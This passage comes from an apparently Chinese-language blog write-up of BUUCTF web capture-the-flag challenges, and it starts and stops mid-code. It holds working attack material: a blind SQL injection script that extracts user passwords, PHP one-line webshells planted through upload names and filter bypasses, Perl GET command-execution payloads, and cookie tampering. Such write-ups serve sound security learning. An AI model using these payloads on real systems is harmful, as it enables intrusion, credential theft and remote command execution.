session.get(base_url, params=params).text</span><br><span class="line">            <span class="built_in">print</span>(<span class="built_in">len</span>(res))</span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">len</span>(res) == <span class="number">117007</span> :</span><br><span class="line">                table_name += c</span><br><span class="line">                <span class="built_in">print</span>(table_name)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_column_name</span>():</span><br><span class="line">    column_name = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">30</span>):</span><br><span class="line">        <span class="keyword">for</span> c <span class="keyword">in</span> chars:</span><br><span class="line"></span><br><span class="line">            params = &#123;</span><br><span class="line">                <span class="string">&#x27;id&#x27;</span>: <span class="string">&#x27;\\0&#x27;</span>,</span><br><span class="line">                <span class="string">&#x27;path&#x27;</span>: <span class="string">&quot; or (ascii(substr((select group_concat(column_name) from information_schema.columns where table_name= 0x7573657273 and table_schema=database()),&#123;&#125;,1))=&#123;&#125;) #&quot;</span>.<span class="built_in">format</span>(i, <span class="built_in">ord</span>(c))</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment"># print(params[&#x27;path&#x27;])</span></span><br><span class="line">            <span class="comment"># print(base_url)</span></span><br><span class="line">            <span class="comment"># time.sleep(0.5)</span></span><br><span class="line">            res = session.get(base_url, params=params).text</span><br><span class="line">            <span class="built_in">print</span>(<span class="built_in">str</span>(i)+<span class="string">&#x27; &#x27;</span>+<span class="built_in">str</span>(<span class="built_in">len</span>(res))+<span class="string">&#x27; &#x27;</span>+c)</span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">len</span>(res) == <span class="number">117007</span> :</span><br><span class="line">                column_name += c</span><br><span class="line">                <span class="built_in">print</span>(column_name)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_data</span>():</span><br><span class="line">    data = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">30</span>):</span><br><span class="line">        <span class="keyword">for</span> c <span class="keyword">in</span> chars:</span><br><span class="line"></span><br><span class="line">            params = &#123;</span><br><span class="line">                <span class="string">&#x27;id&#x27;</span>: <span class="string">&#x27;\\0&#x27;</span>,</span><br><span class="line">                <span class="string">&#x27;path&#x27;</span>: <span class="string">&quot; or (ascii(substr((select group_concat(password) from users),&#123;&#125;,1))=&#123;&#125;) #&quot;</span>.<span class="built_in">format</span>(i, <span class="built_in">ord</span>(c))</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment"># print(params[&#x27;path&#x27;])</span></span><br><span class="line">            <span class="comment"># print(base_url)</span></span><br><span class="line">            <span class="comment"># time.sleep(0.5)</span></span><br><span class="line">            res = session.get(base_url, params=params).text</span><br><span class="line">            <span class="built_in">print</span>(<span class="built_in">str</span>(i)+<span class="string">&#x27; &#x27;</span>+<span class="built_in">str</span>(<span class="built_in">len</span>(res))+<span class="string">&#x27; &#x27;</span>+c)</span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">len</span>(res) == <span class="number">117007</span> :</span><br><span class="line">                data += c</span><br><span class="line">                <span class="built_in">print</span>(data)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#get_database_name(10)</span></span><br><span class="line"><span class="comment">#get_table_name()</span></span><br><span class="line"><span class="comment">#get_column_name()</span></span><br><span class="line">get_data()</span><br></pre></td></tr></table></figure><p>使用上边爆出来的密码成功登录,来到一个文件上传页面</p><p><img src="/../images/buuctf-web3/image-20221027203616583.png" alt="image-20221027203616583"></p><p>无法上传php文件,这里成功上传了一个文件头写了<code>GIF89a</code>的<code>phtml</code>文件, 返回:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">I logged the file name you uploaded to logs/upload.3673c55acd1587aea22bccc61ea61970.log.php. LOL&lt;script&gt;setTimeout(&#x27;location.href=&quot;user.php&quot;&#x27;,3000);&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>这里虽然不知道刚刚的文件上传到哪里了, 但是这里显示把上传文件的文件名写入了一个php文件里,那我们可以把文件名改为一句话木马的形式,来利用它写入的那个日志文件</p><p>这里直接把文件名改为常规的一句话木马会失败:</p><img src="../images/buuctf-web3/image-20221027204314677.png" alt="image-20221027204314677" style="zoom:67%;" /><p><strong>使用php短标签成功上传</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?=@eval($_POST[&#x27;a&#x27;]);?&gt;</span><br></pre></td></tr></table></figure><img src="../images/buuctf-web3/image-20221027204419575.png" alt="image-20221027204419575" style="zoom:67%;" /><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">I logged the file name you uploaded to logs/upload.3673c55acd1587aea22bccc61ea61970.log.php. LOL</span><br></pre></td></tr></table></figure><p>蚁剑连接该文件后成功找到flag</p><br><hr><br><h1 id="perlGET命令执行-SSRFme"><a href="#perlGET命令执行-SSRFme" class="headerlink" title="[perlGET命令执行]SSRFme"></a>[perlGET命令执行]SSRFme</h1><p>开局给源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">10.244</span>.<span class="number">80.206</span> </span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_X_FORWARDED_FOR&#x27;</span>])) &#123;</span><br><span class="line">        <span class="variable">$http_x_headers</span> = <span class="title function_ invoke__">explode</span>(<span class="string">&#x27;,&#x27;</span>, <span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_X_FORWARDED_FOR&#x27;</span>]);</span><br><span class="line">        <span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>] = <span class="variable">$http_x_headers</span>[<span class="number">0</span>];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$_SERVER</span>[<span class="string">&quot;REMOTE_ADDR&quot;</span>];</span><br><span class="line"></span><br><span class="line">    <span class="variable">$sandbox</span> = <span class="string">&quot;sandbox/&quot;</span> . <span class="title function_ invoke__">md5</span>(<span class="string">&quot;orange&quot;</span> . <span class="variable">$_SERVER</span>[<span class="string">&quot;REMOTE_ADDR&quot;</span>]);</span><br><span class="line">    @<span class="title function_ invoke__">mkdir</span>(<span class="variable">$sandbox</span>);</span><br><span class="line">    @<span class="title function_ invoke__">chdir</span>(<span class="variable">$sandbox</span>);</span><br><span class="line"></span><br><span class="line">    <span class="variable">$data</span> = <span class="title function_ invoke__">shell_exec</span>(<span class="string">&quot;GET &quot;</span> . <span class="title function_ invoke__">escapeshellarg</span>(<span class="variable">$_GET</span>[<span class="string">&quot;url&quot;</span>]));</span><br><span class="line">    <span class="variable">$info</span> = <span class="title function_ invoke__">pathinfo</span>(<span class="variable">$_GET</span>[<span class="string">&quot;filename&quot;</span>]); <span class="comment">//filename传入一个文件的完整路径</span></span><br><span class="line"><span class="comment">// pathinfo的返回值中, $info[&quot;dirname&quot;]为上级目录,$info[&quot;basename&quot;]为文件名</span></span><br><span class="line">    <span class="variable">$dir</span>  = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;.&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="title function_ invoke__">basename</span>(<span class="variable">$info</span>[<span class="string">&quot;dirname&quot;</span>]));</span><br><span class="line"><span class="comment">//basename($info[&quot;dirname&quot;])返回上一级目录的名称 如果$_GET[&quot;filename&quot;]为 /var/www/html/index,php,则这里为html</span></span><br><span class="line">    @<span class="title function_ invoke__">mkdir</span>(<span class="variable">$dir</span>);</span><br><span class="line">    @<span class="title function_ invoke__">chdir</span>(<span class="variable">$dir</span>);</span><br><span class="line">    @<span class="title function_ invoke__">file_put_contents</span>(<span class="title function_ invoke__">basename</span>(<span class="variable">$info</span>[<span class="string">&quot;basename&quot;</span>]), <span class="variable">$data</span>); <span class="comment">//将data写入$_GET[&quot;filename&quot;]指定的文件中</span></span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br></pre></td></tr></table></figure><p>这里可以先根据给出的IP和’orange’一起计算md5,得到<code>$sandbox</code>的路径</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">md5(orange10.244.80.206) = 2eeed2f9aeae6311b507ada8fb98809e</span><br><span class="line">sandbox/2eeed2f9aeae6311b507ada8fb98809e</span><br></pre></td></tr></table></figure><p><strong>这里的考点是<code>perl</code>的<code>GET</code>命令的命令执行漏洞, <code>GET</code>底层调用了<code>open</code>,而<code>open</code>支持<code>file协议</code>,可以通过<code>file</code>协议来执行命令,(尾部需要有管道符)但前提是同目录下要存在一个和要执行的命令同名的文件. 例如:</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">➜  test GET &#x27;file:id|&#x27;</span><br><span class="line">➜  test touch &#x27;id|&#x27;</span><br><span class="line">➜  test GET &#x27;file:id|&#x27;</span><br><span class="line">uid=1000(moxiaoxi) gid=1000(moxiaoxi) groups=1000(moxiaoxi),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),108(lpadmin),124(sambashare)</span><br><span class="line">这里在目录下创建了一个名为&quot;id|&quot;的文件之后, 使用GET &#x27;file:id|&#x27;就能够成功地执行命令了</span><br></pre></td></tr></table></figure><p><code>perl</code>的<code>GET</code>还能够直接读取目录, 这里不通过底层<code>open</code>调用<code>file</code>协议,所以对于同目录下有无同名文件没有要求</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GET /  读取根目录</span><br></pre></td></tr></table></figure><p>所以回到这道题, 有两种方式读取根目录下的内容,第一种是通过<code>file</code>来执行命令</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?url=file:ls /|&amp;filename=ls /|</span><br><span class="line">这里需要执行两次,第一次创建文件,第二次执行命令后将结果写入创建的文件</span><br></pre></td></tr></table></figure><p>或者直接读取:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?url=/&amp;filename=aaa</span><br></pre></td></tr></table></figure><img src="../images/buuctf-web3/image-20221027221017805.png" alt="image-20221027221017805" style="zoom:67%;" /><p>这里看到一个readflag文件,应该是要通过它来读取flag</p><p>这里不能直接使用 <code>/readflag</code>来执行,因为无法创建开头为<code>/</code>的文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">url=file:bash -c /readflag|&amp;filename=bash -c /readflag|</span><br><span class="line">访问:http://8b9d61b0-e82c-4d7a-a8dc-87f936afe346.node4.buuoj.cn:81/sandbox/2eeed2f9aeae6311b507ada8fb98809e/bash%20-c%20/readflag%7C</span><br><span class="line">得到flag</span><br></pre></td></tr></table></figure><p><img src="/../images/buuctf-web3/image-20221027221831388.png" alt="image-20221027221831388"></p><br><hr><br><h1 id="cookie-Cookie-Store"><a href="#cookie-Cookie-Store" class="headerlink" title="[cookie]Cookie Store"></a>[cookie]Cookie Store</h1><p>开始有50刀,买不起flag</p><img src="../images/buuctf-web3/image-20221028090015932.png" alt="image-20221028090015932" style="zoom:67%;" /><p>买一点别的,抓包发现cookie中有个session的值</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">session=eyJtb25leSI6IDEyMCwgImhpc3RvcnkiOiBbIll1bW15IHBlcHBhcmtha2EiXX0=</span><br><span class="line">base64解码:</span><br><span class="line">&#123;&quot;money&quot;: 40, &quot;history&quot;: [&quot;Yummy pepparkaka&quot;]&#125;</span><br></pre></td></tr></table></figure><p>这里记录了本次购买前有多少钱,以及已买到的商品</p><p>直接把这里的money改为大于100,然后编码回去放进<code>cookie</code>里发送</p><p>成功返回了flag</p><img src="../images/buuctf-web3/image-20221028090231443.png" alt="image-20221028090231443" style="zoom:67%;" /><br><hr><br><h1 id="绕过滤写一句话木马-write-shell"><a href="#绕过滤写一句话木马-write-shell" class="headerlink" title="[绕过滤写一句话木马]write_shell"></a>[绕过滤写一句话木马]write_shell</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check</span>(<span class="params"><span class="variable">$input</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/&#x27;| |_|php|;|~|\\^|\\+|eval|&#123;|&#125;/i&quot;</span>,<span class="variable">$input</span>))&#123;</span><br><span class="line">        <span class="comment">// if(preg_match(&quot;/&#x27;| |_|=|php/&quot;,$input))&#123;</span></span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;hacker!!!&#x27;</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$input</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">waf</span>(<span class="params"><span class="variable">$input</span></span>)</span>&#123;</span><br><span class="line">  <span class="keyword">if</span>(<span class="title function_ invoke__">is_array</span>(<span class="variable">$input</span>))&#123;</span><br><span class="line">      <span class="keyword">foreach</span>(<span class="variable">$input</span> <span class="keyword">as</span> <span class="variable">$key</span>=&gt;<span class="variable">$output</span>)&#123;</span><br><span class="line">          <span class="variable">$input</span>[<span class="variable">$key</span>] = <span class="title function_ invoke__">waf</span>(<span class="variable">$output</span>); <span class="comment">//如果传入的是数组,则将每个键的值都单独进行检测,然后赋给键</span></span><br><span class="line">      &#125;</span><br><span class="line">  &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">      <span class="variable">$input</span> = <span class="title function_ invoke__">check</span>(<span class="variable">$input</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$dir</span> = <span class="string">&#x27;sandbox/&#x27;</span> . <span class="title function_ invoke__">md5</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>]) . <span class="string">&#x27;/&#x27;</span>;</span><br><span class="line"><span class="comment">//目录设定为: sandbox/远程ip的md5</span></span><br><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">file_exists</span>(<span class="variable">$dir</span>))&#123;</span><br><span class="line">    <span class="title function_ invoke__">mkdir</span>(<span class="variable">$dir</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">switch</span>(<span class="variable">$_GET</span>[<span class="string">&quot;action&quot;</span>] ?? <span class="string">&quot;&quot;</span>) &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&#x27;pwd&#x27;</span>:</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$dir</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&#x27;upload&#x27;</span>:</span><br><span class="line">        <span class="variable">$data</span> = <span class="variable">$_GET</span>[<span class="string">&quot;data&quot;</span>] ?? <span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="title function_ invoke__">waf</span>(<span class="variable">$data</span>);</span><br><span class="line">        <span class="title function_ invoke__">file_put_contents</span>(<span class="string">&quot;<span class="subst">$dir</span>&quot;</span> . <span class="string">&quot;index.php&quot;</span>, <span class="variable">$data</span>);</span><br><span class="line">&#125; <span class="comment">//向index.php中写入数据</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>先传一下<code>action=pwd</code>,返回路径:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sandbox/c47b21fcf8f0bc8b3920541abd8024fd/</span><br></pre></td></tr></table></figure><p>这里输入的<code>data</code>参数的值会被写入<code>sandbox/c47b21fcf8f0bc8b3920541abd8024fd/index.php</code>中,那么这里的思路就是写一句话木马进去,但是需要绕过<code>check</code>函数的过滤</p><p>这里使用短标签和字符串拼接来绕过对<code>php</code>标签和函数名的过滤:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">action=upload&amp;data=&lt;?=(p.hpinfo)()?&gt;</span><br></pre></td></tr></table></figure><p>访问<code>sandbox/c47b21fcf8f0bc8b3920541abd8024fd/index.php</code>,能够成功执行<code>phpinfo()</code></p><p>那么接下来也不用<code>eval</code>了,直接<code>system</code>执行系统命令: 这里空格被过滤了,使用<code>tab(%09)</code>来代替</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">?action=upload&amp;data=&lt;?=(system)(&quot;ls%09/&quot;)?&gt;</span><br><span class="line">访问sandbox/c47b21fcf8f0bc8b3920541abd8024fd/index.php:</span><br><span class="line"></span><br><span class="line">bin boot dev etc flllllll1112222222lag home lib lib64 media mnt opt proc root run sbin srv start.sh sys tmp usr var var</span><br></pre></td></tr></table></figure><p>读取flag:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?action=upload&amp;data=&lt;?=(system)(&quot;cat%09/flllllll1112222222lag&quot;)?&gt;</span><br></pre></td></tr></table></figure><br><hr><br><h1 id="套娃-Welcome-to-Earth"><a href="#套娃-Welcome-to-Earth" class="headerlink" title="[套娃]Welcome to Earth"></a>[套娃]Welcome to Earth</h1><p>直接一路抓包在源码里找到下一关的路径就行</p><p>有一些在f12抓到的js包里</p><p><img src="/../images/buuctf-web3/image-20221028094031075.png" alt="image-20221028094031075"></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">check_door</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="keyword">var</span> all_radio = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;door_form&quot;</span>).<span class="property">elements</span>;</span><br><span class="line">  <span class="keyword">var</span> guess = <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; all_radio.<span class="property">length</span>; i++)</span><br><span class="line">    <span class="keyword">if</span> (all_radio[i].<span class="property">checked</span>) guess = all_radio[i].<span class="property">value</span>;</span><br><span class="line"></span><br><span class="line">  rand = <span class="title class_">Math</span>.<span class="title function_">floor</span>(<span class="title class_">Math</span>.<span class="title function_">random</span>() * <span class="number">360</span>);</span><br><span class="line">  <span class="keyword">if</span> (rand == guess) <span class="variable language_">window</span>.<span class="property">location</span> = <span class="string">&quot;/open/&quot;</span>;</span><br><span class="line">  <span class="keyword">else</span> <span class="variable language_">window</span>.<span class="property">location</span> = <span class="string">&quot;/die/&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>这里直接找到了下一个目录:<code>open</code></p><p>同样的方法,下一个:<code>fight</code></p><p><img src="/../images/buuctf-web3/image-20221028094301555.png" alt="image-20221028094301555"></p><p><code>fight</code>中,同样找到响应中的<code>js</code>代码:</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Run to scramble original flag</span></span><br><span class="line"><span class="comment">//console.log(scramble(flag, action));</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">scramble</span>(<span class="params">flag, key</span>) &#123;</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; key.<span class="property">length</span>; i++) &#123;</span><br><span class="line">    <span class="keyword">let</span> n = key.<span class="title function_">charCodeAt</span>(i) % flag.<span class="property">length</span>; <span class="comment">//charCodeAt返回字符串key中第i个位置的ascii码, 这里然后对flag的长度取余</span></span><br><span class="line">    <span class="keyword">let</span> temp = flag[i];</span><br><span class="line">    flag[i] = flag[n];</span><br><span class="line">    flag[n] = temp; <span class="comment">//交换flag[i]和flag[n]的位置</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> flag;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">check_action</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="keyword">var</span> action = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;action&quot;</span>).<span class="property">value</span>;</span><br><span class="line">  <span class="keyword">var</span> flag = [<span class="string">&quot;&#123;hey&quot;</span>, <span class="string">&quot;_boy&quot;</span>, <span class="string">&quot;aaaa&quot;</span>, <span class="string">&quot;s_im&quot;</span>, <span class="string">&quot;ck!&#125;&quot;</span>, <span class="string">&quot;_baa&quot;</span>, <span class="string">&quot;aaaa&quot;</span>, <span class="string">&quot;pctf&quot;</span>];</span><br><span class="line"></span><br><span class="line">  <span class="comment">// <span class="doctag">TODO:</span> unscramble function</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>这里<code>scramble</code>将原flag打乱为了:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[&quot;&#123;hey&quot;, &quot;_boy&quot;, &quot;aaaa&quot;, &quot;s_im&quot;, &quot;ck!&#125;&quot;, &quot;_baa&quot;, &quot;aaaa&quot;, &quot;pctf&quot;];</span><br><span class="line">那里肯定是:</span><br><span class="line">pctf&#123;hey........ck!&#125;</span><br><span class="line">pctf&#123;hey_boys_im_baaaaaaaaaack!&#125;</span><br></pre></td></tr></table></figure><p>这里大佬写了个脚本直接遍历:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> itertools</span><br><span class="line">scramble = [<span class="string">&quot;&#123;hey&quot;</span>, <span class="string">&quot;_boy&quot;</span>, <span class="string">&quot;aaaa&quot;</span>, <span class="string">&quot;s_im&quot;</span>, <span class="string">&quot;ck!&#125;&quot;</span>, <span class="string">&quot;_baa&quot;</span>, <span class="string">&quot;aaaa&quot;</span>, <span class="string">&quot;pctf&quot;</span>]</span><br><span class="line">maybe = itertools.permutations(scramble) <span class="comment"># 返回一个迭代器,其中的每一个元素都是列表(和上面不同的排列顺序)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> maybe:</span><br><span class="line">    flag = <span class="string">&#x27;&#x27;</span>.join(i)</span><br><span class="line">    <span class="keyword">if</span> flag.startswith(<span class="string">&#x27;pctf&#123;hey_boys&#x27;</span>) <span class="keyword">and</span> flag.endswith(<span class="string">&#x27;ck!&#125;&#x27;</span>):</span><br><span class="line">        <span class="built_in">print</span>(flag)</span><br><span class="line">输出:</span><br><span class="line">pctf&#123;hey_boys_imaaaa_baaaaaack!&#125;</span><br><span class="line">pctf&#123;hey_boys_imaaaaaaaa_baack!&#125;</span><br><span class="line">pctf&#123;hey_boys_im_baaaaaaaaaack!&#125;</span><br><span class="line">pctf&#123;hey_boys_im_baaaaaaaaaack!&#125;</span><br><span class="line">pctf&#123;hey_boys_imaaaaaaaa_baack!&#125;</span><br><span class="line">pctf&#123;hey_boys_imaaaa_baaaaaack!&#125;</span><br></pre></td></tr></table></figure><p>找个那个最通顺的就是flag了</p><br><hr><br><h1 id="koa-JWT-EasyLogin"><a href="#koa-JWT-EasyLogin" class="headerlink" title="[koa,JWT]EasyLogin"></a>[koa,JWT]EasyLogin</h1><p>注册会返回一个<code>token</code>值</p><p><img src="/../images/buuctf-web3/image-20221028102210022.png" alt="image-20221028102210022"></p><p>然后登录时会将这个值作为<code>authorization</code>的值:</p><p><img src="/../images/buuctf-web3/image-20221028102247082.png" alt="image-20221028102247082"></p><p>响应包里的<code>sess;aok</code>解码为: 好像没什么用</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">eyJ1c2VybmFtZSI6ImFhYSIsIl9leHBpcmUiOjE2NjcwMTAxNTEwNjcsIl9tYXhBZ2UiOjg2NDAwMDAwfQ==</span><br><span class="line">6LLpE8nZKrV_5lVZjcPLng1VDus</span><br><span class="line">&#123;&quot;username&quot;:&quot;aaa&quot;,&quot;_expire&quot;:1667010151067,&quot;_maxAge&quot;:86400000&#125;</span><br></pre></td></tr></table></figure><p>登陆后,这里随便提交一个值然后点击<code>get flag</code>会返回<code>permission denided</code></p><p><img src="/../images/buuctf-web3/image-20221028102544698.png" alt="image-20221028102544698"></p><p>另外注意到登陆时提交的<code>authorization</code>值被两个点分成了三部分,格式有点像<code>JWT</code>,拿到网站上解密一下:</p><img src="../images/buuctf-web3/image-20221028144144203.png" alt="image-20221028144144203" style="zoom:67%;" /><p>这里源码里能找到<code>app.js</code>:</p><p><img src="/../images/buuctf-web3/image-20221028103221300.png" alt="image-20221028103221300"></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> *  或许该用 koa-static 来处理静态文件</span></span><br><span class="line"><span class="comment"> *  